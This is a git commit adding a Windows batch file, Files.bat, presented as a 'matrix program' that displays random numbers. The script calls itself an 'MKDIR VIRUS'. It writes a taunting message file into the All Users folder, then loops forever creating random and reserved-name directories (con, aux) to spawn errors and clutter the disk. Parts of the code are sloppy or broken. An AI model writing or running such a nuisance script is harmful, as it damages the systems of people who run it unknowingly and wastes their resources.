1b1d50e20bfb5d6ee3a27ab92290c1fa8c16ff72
tyurik <42886298+tyurik@users.noreply.github.com>
2018-09-01 16:12:36 +0900

    Write This File (Files.bat) Here
    it`s Program Easy.
    1.Move All Users With CD.
    2.Make Temp Folder.
    3.in inside.make random(but 1~32767)dir.
    4.ERROR with mkdir con,aux
    5.othermkdir and loop

---
+++ Files.bat
@@ -0,0 +1,43 @@
+@echo off
+title Matrix Program
+color 02
+set /a %randomtext%
+cls
+cd C:\Documents and Settings\All Users
+mkdir Temp
+goto maybe
+
+:maybe
+echo Hello Everyone! it`s matrix program here.
+echo im begin of matrix.
+echo %random%
+echo %random%
+echo %random%
+cd C:\Documents and Settings\All Users\Temp
+echo You Trapped from MKDIR VIRUS LOL >> MSG.txt
+echo You Have 2 ways to escape from this virus. >> MSG.txt
+echo Oh I Forget Talk about It`s INFINITY >> MSG.txt
+MSG.txt
+cd C:\Documents and Settings\All Users\0x92b7cb902bc70923790b77092cbr09
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+REM ERROR SPAWNER
+mkdir con
+mkdir aux
+mkdir @#
+mkdir fe
+MKDIR FEWFWEVWEVWEVUNIOWEUCPYWENIONWEYITOYVYW4
+MKDIR FWEFVEW
+MKDIR FERGF
+MKDIR CWFWUNOWEIVU
+MKDIR UIONWEUVPOWEUR
+MKDIR OPGUNEVP
+MKDIR FUWENOVNUWROEPCU
+MKDIR 3G3C4
+goto maybe
